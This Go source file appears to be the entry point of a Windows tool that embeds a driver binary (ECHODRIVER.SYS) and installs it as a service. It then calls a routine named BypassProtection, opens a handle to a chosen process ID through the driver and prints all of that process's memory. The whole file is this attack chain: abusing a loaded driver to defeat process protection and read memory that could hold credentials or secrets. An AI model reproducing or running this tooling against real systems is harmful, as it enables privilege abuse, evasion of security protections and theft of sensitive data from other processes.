package main

import (
	"echodriver/driver"
	"echodriver/services"
	"echodriver/utils"
	_ "embed"
	"errors"
	"flag"
	"fmt"

	"golang.org/x/sys/windows"
)

var PID = flag.Int("pid", 0, "PID of the process to be analyzed")

//go:embed ECHODRIVER.SYS
var DRIVER_BYTES []byte

func main() {

	flag.Parse()
	defer driver.Clean()
	if *PID == 0 {
		utils.ParseError(errors.New("please enter a valid pid"))
		return
	}

	if err := utils.EnableSeDebugPrivilege(); err != nil {
		utils.ParseError(err)
		return
	}

	driver.WriteDriver(DRIVER_BYTES)

	if err := services.SetUpService("EchoDrv", driver.DRIVER_FULL_PATH); err != nil {
		utils.ParseError(err)
		return
	}

	hDriver, err := driver.GetDriverHandle()

	if err != nil {
		utils.ParseError(err)
		return
	}

	if err := driver.BypassProtection(*hDriver); err != nil {
		utils.ParseError(err)
		return
	}
	defer windows.CloseHandle(*hDriver)

	handle, err := driver.GetProcHandle(*hDriver, *PID)

	if err != nil {
		utils.ParseError(err)
		return
	}

	s, _ := driver.ReadAllMemory(*hDriver, handle)

	fmt.Println(s)
}
